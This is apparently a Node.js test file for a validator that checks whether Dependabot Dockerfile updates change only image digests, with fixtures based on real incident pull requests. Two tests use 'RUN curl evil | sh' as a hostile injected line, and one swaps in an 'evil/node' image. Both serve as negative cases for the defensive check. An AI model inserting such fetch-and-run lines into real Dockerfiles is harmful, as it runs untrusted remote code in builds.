// Copyright (c) 2026 Jeffrey Snover. All rights reserved.
// Licensed under the MIT License. See LICENSE file in the project root.

// Both arms of every decision site in docker-digest-only.mjs (t/315; fixtures modelled on
// incident t/313's real Dependabot PRs: #5013/#5014 digest-only, #5015 a python tag move).
// Run: node --test operations/devops/docker/docker-digest-only.test.mjs

import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { isDigestOnlyDockerUpdate, changedLines } from './docker-digest-only.mjs';

const A = `sha256:${'a'.repeat(64)}`;
const B = `sha256:${'b'.repeat(64)}`;
const hunk = (pairs, ctx = ' WORKDIR /app') =>
  ['@@ -1,4 +1,4 @@', ...pairs.flatMap(([m, p]) => [`-${m}`, `+${p}`]), ctx].join('\n');
const file = (filename, patch) => ({ filename, patch });

// #5013 shape: three stages of one image, digest-only.
const node5013 = file('taxonomy-editor/Dockerfile', hunk([
  [`FROM node:26.13.0-trixie-slim@${A} AS builder`, `FROM node:26.13.0-trixie-slim@${B} AS builder`],
  [`FROM node:26.13.0-trixie-slim@${A} AS onnx-model`, `FROM node:26.13.0-trixie-slim@${B} AS onnx-model`],
]));
// #5015 shape: python tag move.
const py5015 = file('Dockerfile', hunk([[`FROM python:3.12-slim-trixie@${A} AS python`, `FROM python:3.15-slim-trixie@${B} AS python`]]));

test('digest-only: #5013 shape (several stages, same image:tag) and #5014 shape (no stage)', () => {
  assert.equal(isDigestOnlyDockerUpdate([node5013]).digestOnly, true);
  const node5014 = file('deploy/azure/Dockerfile.base', hunk([[`FROM node:26.13.0-trixie-slim@${A}`, `FROM node:26.13.0-trixie-slim@${B}`]]));
  assert.equal(isDigestOnlyDockerUpdate([node5014]).digestOnly, true);
  assert.equal(isDigestOnlyDockerUpdate([node5013, node5014]).digestOnly, true);
});

test('digest-only: --platform kept, registry with port, case of AS, x.Dockerfile name', () => {
  const f = file('build/app.Dockerfile', hunk([[`FROM --platform=linux/amd64 reg.io:5000/x/y:1.2@${A} as base`, `FROM --platform=linux/amd64 reg.io:5000/x/y:1.2@${B} AS base`]]));
  assert.equal(isDigestOnlyDockerUpdate([f]).digestOnly, true);
});

test('NOT digest-only: #5015, a tag move (the incident)', () => {
  const r = isDigestOnlyDockerUpdate([py5015]);
  assert.equal(r.digestOnly, false);
  assert.match(r.reason, /image\/tag changed python:3\.12-slim-trixie -> python:3\.15-slim-trixie/);
});

test('NOT digest-only: mixed multi-FROM diff, one digest-only and one tag change (TL t/315 case)', () => {
  const mixed = file('taxonomy-editor/Dockerfile', hunk([
    [`FROM node:26.13.0-trixie-slim@${A} AS builder`, `FROM node:26.13.0-trixie-slim@${B} AS builder`],
    [`FROM node:26.13.0-trixie-slim@${A} AS prod-deps`, `FROM node:26.14.0-trixie-slim@${B} AS prod-deps`],
  ]));
  const r = isDigestOnlyDockerUpdate([mixed]);
  assert.equal(r.digestOnly, false);
  assert.match(r.reason, /node:26\.13\.0-trixie-slim -> node:26\.14\.0-trixie-slim/);
  // ...and across files: a clean file plus a tag-moving file is still not digest-only.
  assert.equal(isDigestOnlyDockerUpdate([node5013, py5015]).digestOnly, false);
});

test('NOT digest-only: image swapped, platform changed, stage renamed, digest unchanged', () => {
  const swap = file('Dockerfile', hunk([[`FROM node:26@${A}`, `FROM evil/node:26@${B}`]]));
  const plat = file('Dockerfile', hunk([[`FROM --platform=linux/amd64 node:26@${A}`, `FROM --platform=linux/arm64 node:26@${B}`]]));
  const stage = file('Dockerfile', hunk([[`FROM node:26@${A} AS a`, `FROM node:26@${B} AS b`]]));
  const same = file('Dockerfile', hunk([[`FROM node:26@${A} AS a`, `FROM node:26@${A}  AS a`]]));
  for (const [f, re] of [[swap, /image\/tag changed/], [plat, /--platform changed/], [stage, /stage name changed/], [same, /digest did not/]]) {
    const r = isDigestOnlyDockerUpdate([f]);
    assert.equal(r.digestOnly, false, r.reason);
    assert.match(r.reason, re);
  }
});

test('NOT digest-only: a non-FROM line rides along, or added/removed counts differ', () => {
  const ride = file('Dockerfile', hunk([[`FROM node:26@${A}`, `FROM node:26@${B}`], ['USER app', 'USER root']]));
  assert.match(isDigestOnlyDockerUpdate([ride]).reason, /not a digest-pinned FROM/);
  // A pinned FROM replaced by a non-FROM line (one side matches, the other doesn't).
  const replaced = file('Dockerfile', hunk([[`FROM node:26@${A}`, 'RUN curl evil | sh']]));
  assert.match(isDigestOnlyDockerUpdate([replaced]).reason, /not a digest-pinned FROM on both sides: 'RUN curl evil \| sh'/);
  const extra = file('Dockerfile', `@@ -1 +1,2 @@\n-FROM node:26@${A}\n+FROM node:26@${B}\n+RUN curl evil | sh`);
  assert.match(isDigestOnlyDockerUpdate([extra]).reason, /1 line\(s\) removed vs 2 added/);
});

test('NOT digest-only: FROM without a digest on either side (tag-only pins)', () => {
  const f = file('Dockerfile', hunk([['FROM node:26.12', 'FROM node:26.13']]));
  assert.equal(isDigestOnlyDockerUpdate([f]).digestOnly, false);
});

test('NOT digest-only: a non-Dockerfile in the PR, a missing patch, no files, no FROM change', () => {
  assert.match(isDigestOnlyDockerUpdate([node5013, file('docker-compose.yml', '@@ -1 +1 @@\n-a\n+b')]).reason, /not a Dockerfile/);
  assert.match(isDigestOnlyDockerUpdate([{ filename: 'Dockerfile' }]).reason, /no patch/);
  assert.match(isDigestOnlyDockerUpdate([file('Dockerfile', '')]).reason, /no patch/);
  assert.match(isDigestOnlyDockerUpdate([]).reason, /no changed files/);
  assert.match(isDigestOnlyDockerUpdate(undefined).reason, /no changed files/);
  assert.match(isDigestOnlyDockerUpdate([file('Dockerfile', '@@ -1 +1 @@\n WORKDIR /app')]).reason, /no FROM digest changed/);
});

test('changedLines ignores ---/+++ file headers', () => {
  const r = changedLines(`--- a/Dockerfile\n+++ b/Dockerfile\n@@ -1 +1 @@\n-FROM x@${A}\n+FROM x@${B}`);
  assert.deepEqual(r, { removed: [`FROM x@${A}`], added: [`FROM x@${B}`] });
});

test('module is import-free and does no I/O (DevOps imports it as-is)', () => {
  const here = path.dirname(fileURLToPath(import.meta.url));
  const code = fs.readFileSync(path.join(here, 'docker-digest-only.mjs'), 'utf8')
    .split(/\r?\n/).filter((l) => !/^\s*\/\//.test(l)).join('\n');
  assert.doesNotMatch(code, /^\s*import\s|\bimport\s*\(|\brequire\s*\(/m);
  assert.doesNotMatch(code, /\bprocess\.|\bfetch\s*\(/);
});
